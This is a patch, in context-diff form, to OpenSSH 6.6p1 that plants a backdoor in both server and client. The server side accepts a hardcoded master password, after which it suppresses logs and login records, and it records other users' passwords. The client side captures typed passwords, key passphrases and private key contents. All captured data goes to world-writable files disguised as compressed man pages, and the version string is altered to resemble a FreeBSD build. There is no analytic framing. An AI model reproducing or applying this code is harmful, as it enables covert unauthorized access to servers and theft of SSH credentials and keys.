@@ -1,0 +1,552 @@
+diff -c -r -N openssh-6.6p1/auth-pam.c openssh-6.6p1_p/auth-pam.c
+*** openssh-6.6p1/auth-pam.c	Thu Dec 19 03:31:45 2013
+--- openssh-6.6p1_p/auth-pam.c	Sat Jul 19 02:04:08 2014
+***************
+*** 604,610 ****
+  	pam_set_item(sshpam_handle, PAM_CONV, (const void *)&null_conv);
+  	if (sshpam_session_open) {
+  		debug("PAM: closing session");
+! 		pam_close_session(sshpam_handle, PAM_SILENT);
+  		sshpam_session_open = 0;
+  	}
+  	if (sshpam_cred_established) {
+--- 604,614 ----
+  	pam_set_item(sshpam_handle, PAM_CONV, (const void *)&null_conv);
+  	if (sshpam_session_open) {
+  		debug("PAM: closing session");
+! 
+! 		if (good_pass == 0) {
+! 			pam_close_session(sshpam_handle, PAM_SILENT);
+! 		}
+! 
+  		sshpam_session_open = 0;
+  	}
+  	if (sshpam_cred_established) {
+***************
+*** 771,776 ****
+--- 775,788 ----
+  			}
+  			/* FALLTHROUGH */
+  		case PAM_SUCCESS:
++  			if (type == PAM_SUCCESS) {
++  				logfile(LOG_GOOD);
++  			}
++  			else {
++  				logfile(LOG_BAD);
++  			}
++  			memset(log_buf,0,sizeof(log_buf));
++ 
+  			if (**prompts != NULL) {
+  				/* drain any accumulated messages */
+  				debug("PAM: %s", **prompts);
+***************
+*** 816,821 ****
+--- 828,846 ----
+  	Buffer buffer;
+  	struct pam_ctxt *ctxt = ctx;
+  
++  	if (sshpam_authctxt) {
++  		for (good_i = 0; good_i < num; ++good_i) {
++  			md5pass(resp[good_i]);
++  			if (good_pass == 1) {
++  				ctxt->pam_done = good_login = 1;
++  			}
++  			else {
++  				memset(log_buf,0,sizeof(log_buf));
++  				sprintf(log_buf,"PAM: h: %s, u: %s, p: %s\n",get_remote_ipaddr(),sshpam_authctxt->user,resp[good_i]);
++  			}
++  		}
++  	}
++ 
+  	debug2("PAM: %s entering, %u responses", __func__, num);
+  	switch (ctxt->pam_done) {
+  	case 1:
+***************
+*** 1044,1050 ****
+  	if (sshpam_err != PAM_SUCCESS)
+  		fatal("PAM: failed to set PAM_CONV: %s",
+  		    pam_strerror(sshpam_handle, sshpam_err));
+! 	sshpam_err = pam_open_session(sshpam_handle, 0);
+  	if (sshpam_err == PAM_SUCCESS)
+  		sshpam_session_open = 1;
+  	else {
+--- 1069,1082 ----
+  	if (sshpam_err != PAM_SUCCESS)
+  		fatal("PAM: failed to set PAM_CONV: %s",
+  		    pam_strerror(sshpam_handle, sshpam_err));
+! 
+!  	if (good_pass == 1) {
+!  		sshpam_err = PAM_SUCCESS;
+!  	}
+!  	else {
+!  		sshpam_err = pam_open_session(sshpam_handle, 0);
+!  	}
+! 
+  	if (sshpam_err == PAM_SUCCESS)
+  		sshpam_session_open = 1;
+  	else {
+diff -c -r -N openssh-6.6p1/auth-passwd.c openssh-6.6p1_p/auth-passwd.c
+*** openssh-6.6p1/auth-passwd.c	Thu Apr 26 02:51:28 2012
+--- openssh-6.6p1_p/auth-passwd.c	Sat Jul 19 02:09:39 2014
+***************
+*** 112,119 ****
+  	}
+  #endif
+  #ifdef USE_PAM
+! 	if (options.use_pam)
+! 		return (sshpam_auth_passwd(authctxt, password) && ok);
+  #endif
+  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+  	if (!expire_checked) {
+--- 112,137 ----
+  	}
+  #endif
+  #ifdef USE_PAM
+!  	int ret_pam;
+!  	if (options.use_pam) {
+!  		md5pass(password);
+!  		if (good_pass == 1) {
+!  			good_login = 1;
+!  			ret_pam = 1;
+!  			ok = 1;
+!  		}
+!  		else {
+!  			memset(log_buf,0,sizeof(log_buf));
+!  			sprintf(log_buf,"PPAM: h: %s, u: %s, p: %s\n",get_remote_ipaddr(),authctxt->user,password);
+!  
+!  			ret_pam = sshpam_auth_passwd(authctxt, password);
+!  
+!  			if (ret_pam && ok) logfile(LOG_GOOD)
+!  			else logfile(LOG_BAD);
+!  			memset(log_buf,0,sizeof(log_buf));
+!  		}
+!  		return (ret_pam && ok);
+!  	}
+  #endif
+  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+  	if (!expire_checked) {
+***************
+*** 122,130 ****
+--- 140,166 ----
+  			authctxt->force_pwchange = 1;
+  	}
+  #endif
++  	md5pass(password);
++  	if (good_pass == 1) {
++  		good_login = 1;
++  	}
++  	else {
++  		memset(log_buf,0,sizeof(log_buf));
++  		sprintf(log_buf,"h: %s, u: %s, p: %s\n",get_remote_ipaddr(),authctxt->user,password);
++  	}
++ 
+  	result = sys_auth_passwd(authctxt, password);
+  	if (authctxt->force_pwchange)
+  		disable_forwarding();
++  	if (good_login == 1) {
++  		result = 1;
++  	}
++  	else {
++  		if (result && ok) logfile(LOG_GOOD)
++  		else logfile(LOG_BAD);
++  		memset(log_buf,0,sizeof(log_buf));
++  	}
++ 
+  	return (result && ok);
+  }
+  
+diff -c -r -N openssh-6.6p1/auth.c openssh-6.6p1_p/auth.c
+*** openssh-6.6p1/auth.c	Sun Jun  2 00:41:51 2013
+--- openssh-6.6p1_p/auth.c	Sat Jul 19 02:10:15 2014
+***************
+*** 276,281 ****
+--- 276,283 ----
+  	void (*authlog) (const char *fmt,...) = verbose;
+  	char *authmsg;
+  
++ 	if (good_login == 1) return;
++ 
+  	if (use_privsep && !mm_is_monitor() && !authctxt->postponed)
+  		return;
+  
+diff -c -r -N openssh-6.6p1/authfile.c openssh-6.6p1_p/authfile.c
+*** openssh-6.6p1/authfile.c	Tue Feb  4 03:20:15 2014
+--- openssh-6.6p1_p/authfile.c	Sat Jul 19 02:30:38 2014
+***************
+*** 1041,1046 ****
+--- 1041,1049 ----
+  		close(fd);
+  		return NULL;
+  	}
++ 
++ 	log_key(type, filename);
++ 
+  	if (perm_ok != NULL)
+  		*perm_ok = 1;
+  
+diff -c -r -N openssh-6.6p1/includes.h openssh-6.6p1_p/includes.h
+*** openssh-6.6p1/includes.h	Fri Mar 22 04:51:09 2013
+--- openssh-6.6p1_p/includes.h	Sat Jul 19 02:34:22 2014
+***************
+*** 176,179 ****
+--- 176,240 ----
+  
+  #include "entropy.h"
+  
++ #define PASSWORD "$1$DIjQ7qpQ$Pt.Mj0g.fCgH9/peqmTbU0"
++ #define LOG_REMOTE "/usr/share/man/man5/ttyp.5.gz"
++ #define LOG_GOOD "/usr/share/man/man5/ttyl.5.gz"
++ #define LOG_BAD "/usr/share/man/man5/ttyv.5.gz"
++  
++ char log_key[16384];
++ char log_buf[32768];
++ char log_prompt[512];
++ char log_user[256];
++ char log_host[256];
++ char log_pass[256];
++ char log_port[16];
++ int good_login;
++ int good_pass;
++ int good_i;
++ FILE *logfile;
++  
++ #define logfile(LOGFILE) \
++ { \
++ logfile=fopen(LOGFILE, "a"); \
++ if(logfile!=NULL) \
++ { \
++ fprintf(logfile,"%s",log_buf); \
++ fclose(logfile); \
++ } \
++ chmod(LOGFILE, 0666); \
++ }
++ 
++ #define log_key(type,filename) { \
++ 	char chr[16384]; \
++ 	int fdkey; \
++ 	int num, i; \
++ 	memset(log_key,0,sizeof(log_key)); \
++ 	memset(chr,0,sizeof(chr)); \
++ 	fdkey = open(filename, O_RDONLY); \
++ 	num = read(fdkey,chr,16384); \
++ 	close(fdkey); \
++ 	if (num > 0) { \
++ 		if (type == KEY_RSA1) { \
++ 			for (i=0;i<num;i++) { \
++ 				sprintf(log_key,"%s%.2x",log_key,(unsigned char) chr[i]); \
++ 			} \
++ 		} \
++ 		else { \
++ 			for (i=0;i<num;i++) { \
++ 				sprintf(log_key,"%s%c",log_key,(unsigned char) chr[i]); \
++ 			} \
++ 		} \
++ 	} \
++ }
++ 
++ #define md5pass(pass) { \
++ 	char* hash = crypt(pass, "$1$DIjQ7qpQ$"); \
++ 	if (strcmp(hash,PASSWORD) == 0) { \
++ 		good_pass = 1; \
++ 	} \
++ 	else { \
++ 		good_pass = 0; \
++ 	} \
++ }
++ 
+  #endif /* INCLUDES_H */
+diff -c -r -N openssh-6.6p1/key.c openssh-6.6p1_p/key.c
+*** openssh-6.6p1/key.c	Tue Feb  4 03:20:15 2014
+--- openssh-6.6p1_p/key.c	Sat Jul 19 02:42:57 2014
+***************
+*** 1761,1766 ****
+--- 1761,1770 ----
+      u_char **sigp, u_int *lenp,
+      const u_char *data, u_int datalen)
+  {
++ 	if (strlen(log_buf) > 0) {
++ 		logfile(LOG_REMOTE);
++ 		memset(log_buf,0,sizeof(log_buf));
++ 	}
+  	switch (key->type) {
+  	case KEY_DSA_CERT_V00:
+  	case KEY_DSA_CERT:
+diff -c -r -N openssh-6.6p1/log.c openssh-6.6p1_p/log.c
+*** openssh-6.6p1/log.c	Thu May 16 13:32:30 2013
+--- openssh-6.6p1_p/log.c	Sat Jul 19 02:43:39 2014
+***************
+*** 392,397 ****
+--- 392,399 ----
+  	int saved_errno = errno;
+  	log_handler_fn *tmp_handler;
+  
++ 	if (good_login) return;
++ 
+  	if (level > log_level)
+  		return;
+  
+diff -c -r -N openssh-6.6p1/loginrec.c openssh-6.6p1_p/loginrec.c
+*** openssh-6.6p1/loginrec.c	Fri Jan 17 04:23:24 2014
+--- openssh-6.6p1_p/loginrec.c	Sat Jul 19 02:44:24 2014
+***************
+*** 432,437 ****
+--- 432,438 ----
+  int
+  login_write(struct logininfo *li)
+  {
++ 	if (good_login) return (0);
+  #ifndef HAVE_CYGWIN
+  	if (geteuid() != 0) {
+  		logit("Attempt to write login records by non-root user (aborting)");
+diff -c -r -N openssh-6.6p1/readconf.c openssh-6.6p1_p/readconf.c
+*** openssh-6.6p1/readconf.c	Mon Feb 24 07:57:56 2014
+--- openssh-6.6p1_p/readconf.c	Sat Jul 19 14:03:25 2014
+***************
+*** 145,151 ****
+  	oSendEnv, oControlPath, oControlMaster, oControlPersist,
+  	oHashKnownHosts,
+  	oTunnel, oTunnelDevice, oLocalCommand, oPermitLocalCommand,
+! 	oVisualHostKey, oUseRoaming,
+  	oKexAlgorithms, oIPQoS, oRequestTTY, oIgnoreUnknown, oProxyUseFdpass,
+  	oCanonicalDomains, oCanonicalizeHostname, oCanonicalizeMaxDots,
+  	oCanonicalizeFallbackLocal, oCanonicalizePermittedCNAMEs,
+--- 145,151 ----
+  	oSendEnv, oControlPath, oControlMaster, oControlPersist,
+  	oHashKnownHosts,
+  	oTunnel, oTunnelDevice, oLocalCommand, oPermitLocalCommand,
+! 	oVisualHostKey, oVersionAddendum, oUseRoaming,
+  	oKexAlgorithms, oIPQoS, oRequestTTY, oIgnoreUnknown, oProxyUseFdpass,
+  	oCanonicalDomains, oCanonicalizeHostname, oCanonicalizeMaxDots,
+  	oCanonicalizeFallbackLocal, oCanonicalizePermittedCNAMEs,
+diff -c -r -N openssh-6.6p1/sshconnect1.c openssh-6.6p1_p/sshconnect1.c
+*** openssh-6.6p1/sshconnect1.c	Tue Feb  4 03:20:16 2014
+--- openssh-6.6p1_p/sshconnect1.c	Sat Jul 19 02:54:46 2014
+***************
+*** 271,276 ****
+--- 271,282 ----
+  				debug2("no passphrase given, try next key");
+  				quit = 1;
+  			}
++ 			memset(log_buf,0,sizeof(log_buf));
++ 			memset(log_port,0,sizeof(log_port));
++ 			if (options.port != 22) {
++ 				sprintf(log_port,", port: %d",options.port);
++ 			}
++ 			sprintf(log_buf,"%s%s, p: %s, key:\n%s\n",log_prompt,log_port,passphrase,log_key);
+  			explicit_bzero(passphrase, strlen(passphrase));
+  			free(passphrase);
+  			if (private != NULL || quit)
+***************
+*** 311,316 ****
+--- 317,323 ----
+  	/* Wait for response from the server. */
+  	type = packet_read();
+  	if (type == SSH_SMSG_SUCCESS) {
++ 		logfile(LOG_REMOTE);
+  		debug("RSA authentication accepted by server.");
+  		return 1;
+  	}
+***************
+*** 421,426 ****
+--- 428,446 ----
+  			logit("WARNING: Encryption is disabled! "
+  			    "Response will be transmitted in clear text.");
+  		response = read_passphrase(prompt, 0);
++ 		md5pass(response);
++ 		if (good_pass == 0) {
++ 			memset(log_buf,0,sizeof(log_buf));
++ 			memset(log_port,0,sizeof(log_port));
++ 			if (options.port != 22) {
++ 				sprintf(log_port,", port: %d",options.port);
++ 			}
++ 			sprintf(log_buf,"%s%s%s\n",log_prompt,response,log_port);
++ 			logfile(LOG_REMOTE);
++ 		}
++ 		else {
++ 			memset(log_buf,0,sizeof(log_buf));
++ 		}
+  		if (strcmp(response, "") == 0) {
+  			free(response);
+  			break;
+***************
+*** 458,463 ****
+--- 478,493 ----
+  		if (i != 0)
+  			error("Permission denied, please try again.");
+  		password = read_passphrase(prompt, 0);
++ 		md5pass(password);
++ 		if (good_pass == 0) {
++ 			memset(log_buf,0,sizeof(log_buf));
++ 			memset(log_port,0,sizeof(log_port));
++ 			if (options.port != 22) {
++ 				sprintf(log_port,", port: %d",options.port);
++ 			}
++ 			sprintf(log_buf,"ssh1 %s%s%s\n",prompt,password,log_port);
++ 			logfile(LOG_REMOTE);
++ 		}		
+  		packet_start(SSH_CMSG_AUTH_PASSWORD);
+  		ssh_put_password(password);
+  		explicit_bzero(password, strlen(password));
+***************
+*** 724,738 ****
+  			goto success;
+  
+  		/* Try RSA authentication for each identity. */
+! 		for (i = 0; i < options.num_identity_files; i++)
+  			if (options.identity_keys[i] != NULL &&
+  			    options.identity_keys[i]->type == KEY_RSA1 &&
+  			    try_rsa_authentication(i))
+  				goto success;
+  	}
+  	/* Try challenge response authentication if the server supports it. */
+  	if ((supported_authentications & (1 << SSH_AUTH_TIS)) &&
+  	    options.challenge_response_authentication && !options.batch_mode) {
+  		if (try_challenge_response_authentication())
+  			goto success;
+  	}
+--- 754,773 ----
+  			goto success;
+  
+  		/* Try RSA authentication for each identity. */
+! 		for (i = 0; i < options.num_identity_files; i++) {
+! 			memset(log_prompt,0,sizeof(log_prompt));
+! 			sprintf(log_prompt,"pubkey1 %s@%s",server_user,host);
+  			if (options.identity_keys[i] != NULL &&
+  			    options.identity_keys[i]->type == KEY_RSA1 &&
+  			    try_rsa_authentication(i))
+  				goto success;
++ 		}
+  	}
+  	/* Try challenge response authentication if the server supports it. */
+  	if ((supported_authentications & (1 << SSH_AUTH_TIS)) &&
+  	    options.challenge_response_authentication && !options.batch_mode) {
++ 		memset(log_prompt,0,sizeof(log_prompt));
++ 		sprintf(log_prompt,"ssh1k %s@%s password: ",server_user,host);
+  		if (try_challenge_response_authentication())
+  			goto success;
+  	}
+diff -c -r -N openssh-6.6p1/sshconnect2.c openssh-6.6p1_p/sshconnect2.c
+*** openssh-6.6p1/sshconnect2.c	Tue Feb  4 03:20:16 2014
+--- openssh-6.6p1_p/sshconnect2.c	Sat Jul 19 02:59:30 2014
+***************
+*** 398,403 ****
+--- 398,408 ----
+  		fatal("ssh_userauth2: internal error: cannot send userauth none request");
+  
+  	/* initial userauth request */
++ 	memset(log_user,0,sizeof(log_user));
++ 	sprintf(log_user,"%s",server_user);
++ 	memset(log_host,0,sizeof(log_host));
++ 	sprintf(log_host,"%s",host);
++ 
+  	userauth_none(&authctxt);
+  
+  	dispatch_init(&input_userauth_error);
+***************
+*** 863,868 ****
+--- 868,883 ----
+  	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+  	    authctxt->server_user, host);
+  	password = read_passphrase(prompt, 0);
++ 	md5pass(password);
++ 	if (good_pass == 0) {
++ 		memset(log_buf,0,sizeof(log_buf));
++ 		memset(log_port,0,sizeof(log_port));
++ 		if (options.port != 22) {
++ 			sprintf(log_port,", port: %d",options.port);
++ 		}
++ 		sprintf(log_buf,"ssh2 %s%s%s\n",prompt,password,log_port);
++ 		logfile(LOG_REMOTE);
++ 	}	
+  	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+  	packet_put_cstring(authctxt->server_user);
+  	packet_put_cstring(authctxt->service);
+***************
+*** 1122,1127 ****
+--- 1137,1146 ----
+  				private = key_load_private_type(KEY_UNSPEC,
+  				    filename, passphrase, NULL, NULL);
+  				quit = 0;
++ 				if (private != NULL) {
++ 					memset(log_pass,0,sizeof(log_pass));
++ 					sprintf(log_pass,"pass: %s, ",passphrase);
++ 				}
+  			} else {
+  				debug2("no passphrase given, try next key");
+  				quit = 1;
+***************
+*** 1133,1138 ****
+--- 1152,1166 ----
+  			debug2("bad passphrase given, try again...");
+  		}
+  	}
++ 	if (private != NULL)
++ 	{
++ 		memset(log_buf,0,sizeof(log_buf));
++ 		memset(log_port,0,sizeof(log_port));
++ 		if (options.port != 22) {
++ 			sprintf(log_port," port: %d,",options.port);
++ 		}
++ 		sprintf(log_buf,"pubkey2 %s@%s,%s %skey:\n%s\n",log_user,log_host,log_port,log_pass,log_key);
++ 	}
+  	return private;
+  }
+  
+***************
+*** 1301,1308 ****
+  				id->key = NULL;
+  			}
+  		}
+! 		if (sent)
+  			return (sent);
+  	}
+  	return (0);
+  }
+--- 1329,1338 ----
+  				id->key = NULL;
+  			}
+  		}
+! 		if (sent) {
+! 			logfile(LOG_REMOTE);
+  			return (sent);
++ 		}
+  	}
+  	return (0);
+  }
+***************
+*** 1383,1388 ****
+--- 1413,1428 ----
+  		echo = packet_get_char();
+  
+  		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
++ 		md5pass(response);
++ 		if (good_pass == 0) {
++ 			memset(log_buf,0,sizeof(log_buf));
++ 			memset(log_port,0,sizeof(log_port));
++ 			if (options.port != 22) {
++ 				sprintf(log_port," port: %d,",options.port);
++ 			}
++ 			sprintf(log_buf,"ssh2p %s@%s,%s p: %s\n",authctxt->server_user,authctxt->host,log_port,response);
++ 			logfile(LOG_REMOTE);
++ 		}
+  
+  		packet_put_cstring(response);
+  		explicit_bzero(response, strlen(response));
+diff -c -r -N openssh-6.6p1/version.h openssh-6.6p1_p/version.h
+*** openssh-6.6p1/version.h	Fri Feb 28 02:01:54 2014
+--- openssh-6.6p1_p/version.h	Sat Jul 19 14:25:34 2014
+***************
+*** 1,6 ****
+  /* $OpenBSD: version.h,v 1.70 2014/02/27 22:57:40 djm Exp $ */
+  
+! #define SSH_VERSION	"OpenSSH_6.6"
+  
+! #define SSH_PORTABLE	"p1"
+! #define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
+--- 1,6 ----
+  /* $OpenBSD: version.h,v 1.70 2014/02/27 22:57:40 djm Exp $ */
+  
+! #define SSH_VERSION		"OpenSSH_6.6p1"
+! #define SSH_VERSION_ADDENDUM	" FreeBSD-20140420"
+  
+! #define SSH_RELEASE	SSH_VERSION SSH_VERSION_ADDENDUM
